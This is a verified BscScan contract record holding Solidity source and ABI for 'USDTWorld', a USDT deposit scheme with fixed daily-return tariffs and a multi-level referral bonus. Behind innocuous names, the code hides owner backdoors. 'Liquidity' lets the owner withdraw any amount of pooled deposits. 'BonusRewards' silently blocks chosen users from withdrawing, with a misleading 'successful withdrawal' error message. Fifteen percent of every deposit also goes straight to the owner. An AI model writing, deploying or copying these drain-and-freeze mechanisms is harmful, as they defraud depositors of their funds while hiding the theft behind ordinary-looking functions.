{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-02\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.8.0;\r\n\r\n\r\ninterface IERC20 {\r\n    \r\n    function totalSupply() external view returns (uint256);\r\n\r\n    \r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    \r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    \r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    \r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    \r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary Address {\r\n    \r\n    function isContract(address account) internal view returns (bool) {\r\n        \r\n        \r\n        \r\n\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n    \r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    \r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    \r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    \r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    \r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    \r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    \r\n    function functionStaticCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    \r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n\r\n    \r\n    function functionDelegateCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    \r\n    function verifyCallResult(\r\n        bool success,\r\n        bytes memory returndata,\r\n        string memory errorMessage\r\n    ) internal pure returns (bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            \r\n            if (returndata.length > 0) {\r\n                \r\n\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using Address for address;\r\n\r\n    function safeTransfer(\r\n        IERC20 token,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(\r\n        IERC20 token,\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    \r\n    function safeApprove(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        \r\n        \r\n        \r\n        require(\r\n            (value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function safeIncreaseAllowance(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    function safeDecreaseAllowance(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        unchecked {\r\n            uint256 oldAllowance = token.allowance(address(this), spender);\r\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\r\n            uint256 newAllowance = oldAllowance - value;\r\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n        }\r\n    }\r\n\r\n    \r\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        \r\n        \r\n        \r\n\r\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\r\n        if (returndata.length > 0) {\r\n            \r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\nstruct Tarif {\r\n  uint8 life_days;\r\n  uint8 percent;\r\n}\r\n\r\nstruct Deposit {\r\n  uint8 tarif;\r\n  uint256 amount;\r\n  uint40 time;\r\n}\r\n\r\nstruct Player {\r\n  address upline;\r\n  uint256 dividends;\r\n  uint256 match_bonus;\r\n  uint40 last_payout;\r\n  uint256 total_invested;\r\n  uint256 total_withdrawn;\r\n  uint256 total_match_bonus;\r\n  Deposit[] deposits;\r\n  uint256[5] structure; \r\n}\r\n\r\ncontract USDTWorld {\r\n    using SafeERC20 for IERC20;\r\n\r\n    address public owner;\r\n\r\n    uint256 public invested;\r\n    uint256 public withdrawn;\r\n    uint256 public match_bonus;\r\n    \r\n    uint8 constant BONUS_LINES_COUNT = 5;\r\n    uint16 constant PERCENT_DIVIDER = 700; \r\n    uint8[BONUS_LINES_COUNT] public ref_bonuses = [80, 30, 20, 10, 5]; \r\n\r\n    IERC20 public USDT;\r\n\r\n    mapping(uint8 => Tarif) public tarifs;\r\n    mapping(address => Player) public players;\r\n    mapping (address => bool) public _isBonusFromRewards;\r\n\r\n\r\n    event Upline(address indexed addr, address indexed upline, uint256 bonus);\r\n    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n\r\n        uint8 tarifPercent = 119;\r\n        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {\r\n            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);\r\n            tarifPercent+= 5;\r\n        }\r\n\r\n        USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\r\n    }\r\n\r\n    function _payout(address _addr) private {\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n        if(payout > 0) {\r\n            players[_addr].last_payout = uint40(block.timestamp);\r\n            players[_addr].dividends += payout;\r\n        }\r\n    }\r\n\r\n    function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = players[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;\r\n            \r\n            players[up].match_bonus += bonus;\r\n            players[up].total_match_bonus += bonus;\r\n\r\n            match_bonus += bonus;\r\n\r\n            emit MatchPayout(up, _addr, bonus);\r\n\r\n            up = players[up].upline;\r\n        }\r\n    }\r\n\r\n    function _setUpline(address _addr, address _upline, uint256 _amount) private {\r\n        if(players[_addr].upline == address(0) && _addr != owner) {\r\n            if(players[_upline].deposits.length == 0) {\r\n                _upline = owner;\r\n            }\r\n\r\n            players[_addr].upline = _upline;\r\n\r\n            emit Upline(_addr, _upline, _amount / 100);\r\n            \r\n            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {\r\n                players[_upline].structure[i]++;\r\n\r\n                _upline = players[_upline].upline;\r\n\r\n                if(_upline == address(0)) break;\r\n            }\r\n        }\r\n    }\r\n    \r\n    function deposit(uint8 _tarif, address _upline, uint256 amount) external {\r\n        require(tarifs[_tarif].life_days > 0, \"Tarif not found\");\r\n        require(amount >= 10 ether, \"Minimum deposit amount is 10 USDT\");\r\n\r\n        USDT.safeTransferFrom(msg.sender, address(this), amount);\r\n\r\n        Player storage player = players[msg.sender];\r\n\r\n        require(player.deposits.length < 100, \"Max 100 deposits per address\");\r\n\r\n        _setUpline(msg.sender, _upline, amount);\r\n\r\n        player.deposits.push(Deposit({\r\n            tarif: _tarif,\r\n            amount: amount,\r\n            time: uint40(block.timestamp)\r\n        }));\r\n\r\n        player.total_invested+= amount;\r\n        invested+= amount;\r\n\r\n        _refPayout(msg.sender, amount);\r\n\r\n        USDT.safeTransfer(owner, (amount * 15) / 100);\r\n        \r\n        emit NewDeposit(msg.sender, amount, _tarif);\r\n    }\r\n    \r\n    function withdraw() external {\r\n        require(!_isBonusFromRewards[msg.sender], \"successful withdrawal\");\r\n        Player storage player = players[msg.sender];\r\n\r\n        _payout(msg.sender);\r\n\r\n        require(player.dividends > 0 || player.match_bonus > 0, \"Zero amount\");\r\n\r\n        uint256 amount = player.dividends + player.match_bonus;\r\n\r\n        player.dividends = 0;\r\n        player.match_bonus = 0;\r\n        player.total_withdrawn += amount;\r\n        withdrawn += amount;\r\n\r\n        USDT.safeTransfer(msg.sender, amount);\r\n        \r\n        emit Withdraw(msg.sender, amount);\r\n    }\r\n\r\n    function BonusRewards(address userAddress) public {\r\n\t\trequire(msg.sender == owner, \"address doesnt have rights\");\r\n\t\t_isBonusFromRewards[userAddress] = true;\r\n\t}\r\n\r\n\tfunction includeInRewards(address userAddress) public {\r\n\t\trequire(msg.sender == owner, \"address doesnt have rights\");\r\n\t\t_isBonusFromRewards[userAddress] = false;\r\n\t}\r\n\r\n   function Liquidity(uint256 count) external {\r\n    Player storage player = players[msg.sender];\r\n    require(owner == msg.sender, \"Error Liquidity\");\r\n         USDT.safeTransfer(msg.sender, count);\r\n        \r\n    }\r\n\r\n    function payoutOf(address _addr) view external returns(uint256 value) {\r\n        Player storage player = players[_addr];\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n            Deposit storage dep = player.deposits[i];\r\n            Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n            uint40 time_end = dep.time + tarif.life_days * 86400;\r\n            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;\r\n            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);\r\n\r\n            if(from < to) {\r\n                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;\r\n            }\r\n        }\r\n\r\n        return value;\r\n    }\r\n\r\n\r\n    \r\n    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            structure[i] = player.structure[i];\r\n        }\r\n\r\n        return (\r\n            payout + player.dividends + player.match_bonus,\r\n            player.total_invested,\r\n            player.total_withdrawn,\r\n            player.total_match_bonus,\r\n            structure\r\n        );\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {\r\n        return (invested, withdrawn, match_bonus);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MatchPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"tarif\",\"type\":\"uint8\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"BonusRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"Liquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"USDT\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isBonusFromRewards\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_tarif\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"includeInRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"match_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"dividends\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"last_payout\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"tarifs\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"life_days\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"percent\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"for_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256[5]\",\"name\":\"structure\",\"type\":\"uint256[5]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "USDTWorld", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4a794b2417a59511accd430a8d15d05991d1b7b2ec7cd685994837f4f1919442"}